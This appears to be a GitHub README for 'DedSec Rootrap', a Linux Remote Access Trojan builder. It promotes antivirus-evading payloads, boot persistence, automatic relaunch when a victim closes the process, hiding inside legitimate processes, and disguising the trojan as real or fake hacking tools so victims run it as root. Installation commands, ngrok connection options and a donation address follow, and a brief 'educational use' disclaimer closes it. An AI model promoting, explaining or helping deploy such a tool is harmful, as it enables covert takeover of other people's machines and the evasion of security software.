TOOL is still under construction
<!--
<div>
  <img src="./img/background.png" align="" />
</div>
-->

<p>‎</p>

<div>
  <img src="https://cdn-icons-png.flaticon.com/512/4011/4011063.png" width="128" height="128" align="left" />
</div>


```diff

DEDSEC ROOTRAP FRAMEWORK

DEDSEC ROOTRAP is a linux based RAT builder tool that can create a fully undetected Linux payload.

```



### DESCRIPTION
DedSec Rootrap is a Linux Hacking Framework and Remote Access Trojan builder meticulously crafted for controlling Linux machines. It highlights the advanced DedSec payload, a cutting-edge RAT that empowers users with a suite of advanced functionalities through Meterpreter. This ensures discreet and seamless remote operations on victim systems, employing advanced payload techniques and functionality.

User, DEDSEC ROOTRAP is a comprehensive Linux-based RAT builder tool, providing users with the capability to create fully undetected Linux payloads. This powerful tool not only generates payloads with the utmost stealth but also ensures that the resulting payload automatically attains root access on the victim's machine. This elevated level of access provides the operator with unparalleled control over the targeted Linux system, enabling a wide range of administrative tasks and maximizing the impact of the RAT tool.

### ROOTRAP PAYLOAD FEATURES

<details>
<summary>FUD Payload</summary>
<br>
The tool is equipped with a Fully Undetected (FUD) payload, adding an extra layer of security to evade detection by security software. The FUD payload guarantees the covert execution of malicious operations on the victim's Linux machine.
<br><br>
</details>

<details>
<summary>Persistent Payload</summary>
<br>
Rootrap persistent payload. This advanced functionality ensures the automatic execution of the malicious payload when the target machine is powered on during the boot process. The autostart feature enhances the tool's covert operations, allowing it to quietly initiate upon system startup and maintain a discreet presence on the victim's machine for extended periods.
<br><br>
</details>

<details>
<summary>Self-Running Capability</summary>
<br>
DedSec Rootrap boasts a self-runner capability, empowering it to autonomously initiate and execute without external intervention, thereby enhancing convenience and efficiency across various operational scenarios. Notably, in the event of inadvertent closure of the process by the victim, Rootrap is intelligently designed to automatically relaunch the payload. This not only ensures persistent and uninterrupted operations but also serves as a proactive measure to prevent attackers from terminating Meterpreter sessions abruptly.
<br><br>
</details>

<details>
<summary>Dynamic Process Migration</summary>
<br>
With the ability to self-migrate to legitimate processes, DedSec Rootrap ensures that its presence remains discreet and undetectable. The tool seamlessly integrates into existing processes, minimizing the risk of detection and raising the bar for forensics efforts.
<br><br>
</details>

<details>
<summary>Root Access Privileges techniques</summary>
<br>
DedSec Rootrap achieves complete root access on victim machines by ingeniously leveraging a two-step process. Initially, it prompts the execution of a template payload or a seemingly legitimate tool, requesting them to run as root. Subsequently, the main payload employs a concealed technique, ensuring anonymity and executing with elevated privileges. This strategic approach allows operators to exert unparalleled control over the targeted Linux system, facilitating a broad spectrum of administrative tasks and maximizing the impact of the RAT tool.
<br><br>
</details>

<details>
<summary>Payload Dropper</summary>
<br>
The Payload Dropper feature seamlessly integrates itself within a seemingly legitimate Linux tool, cleverly concealing its true nature to evade suspicion. When the victim initiates this tool, the Dropper executes DedSec techniques, ensuring the anonymity and discreet operation of the main payload within the victim machine's memory. This method allows the main payload to persist even if terminated, as the Dropper establishes a self-runner code. Consequently, even if the machine is powered off, the main payload remains embedded, reactivating upon the victim's PC reboot to sustain the Meterpreter session without interruption.
<br><br>
</details>

<details>
<summary>Template Payload</summary>
<br>
The Template feature plays a crucial role by masquerading as an authentic Linux tool, adept at concealing its true nature to deflect suspicion. When the victim executes this tool, the RAT payload is subtly injected into memory, generating a concealed process to outmaneuver antivirus detection. Additionally, the Template establishes a self-runner code, ensuring the persistent reemergence of the payload, even in the event of termination. This strategic design amplifies the tool's resilience and efficacy by portraying the RAT as a bona fide Linux or hacking tool, effectively masking its genuine intent.
<br><br>
</details>

#### TOOL BANNER
---
![ROOTRAP](https://github.com/0xbitx/DEDSEC_ROOTTRAP/blob/main/banner.png)

### INSTALLATION 
```
$ git clone https://github.com/0xbitx/DEDSEC_ROOTRAP.git
$ cd DEDSEC_ROOTRAP
$ chmod +x dedsec_rootrap setup
$ ./setup
$ ./dedsec_rootrap
```
### TOOL MORE OPTION

##### CONNECTION MODE SECTION:
      1. self port-forward  (if your ip already port forwarded)
      2. rootrap default   (free port forwarding using ngrok)
##### PAYLOAD MODE SECTION:
      1. non-persistent  (payload with autorun but no connection after reboot)
      2. persistent   (payload with auto run )
##### PAYLOAD TEMPLATE SECTION:
      1. custom   (your legit python tool)
      2. dedsec template  (70+ fake hacking tools )
      3. just dropper (just a dropper with payload that run and close)
      
### TESTED ON FOLLOWING
* Kali Linux 
* Parrot OS 

#### VIRUSTOTAL RESULT [ if you are paranoid about running someone else's tool ]
| tool name | checksum                | Link |
| :-------- | ------------------------- | --------- |
| dedsec_rootrap   | 31399d747b7ff1287f2bdbec84488314d1e83c0bfa0e2a5da8c50173d60eec9531 | https://www.virustotal.com/gui/file/  |

## Support

If you find my work helpful and want to support me, consider making a donation. Your contribution will help me continue working on open-source projects.

**Bitcoin Address: `36ALguYpTgFF3RztL4h2uFb3cRMzQALAcm`**

<h1 align="center"> DISCLAIMER </h1>

<h4 align="center">I'm not responsible for anything you do with this program, so please only use it for good and educational purposes. </h4>
